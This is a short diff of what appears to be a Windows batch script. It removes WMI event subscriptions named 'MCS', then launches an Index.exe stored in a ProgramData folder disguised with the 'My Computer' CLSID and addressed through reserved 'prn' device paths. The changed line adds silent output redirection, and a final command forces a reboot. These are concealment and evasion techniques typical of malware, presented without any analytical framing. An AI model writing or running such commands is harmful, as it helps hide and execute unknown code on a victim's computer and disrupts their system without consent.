@@ -48,5 +48,5 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Names
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='MCS'\" | Remove-WmiObject"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='MCS'\" | Remove-WmiObject"
 
-dir \\.\%ProgramData%\prndata..\Index.exe || cmd.exe /c start "" %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn
+dir \\.\%ProgramData%\prndata\prn.exe >nul 2>&1 || cmd.exe /c start \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn <nul >nul 2>&1
 cmd.exe start "" powershell.exe -Command "Start-Sleep -Seconds 30; Restart-Computer -Force"
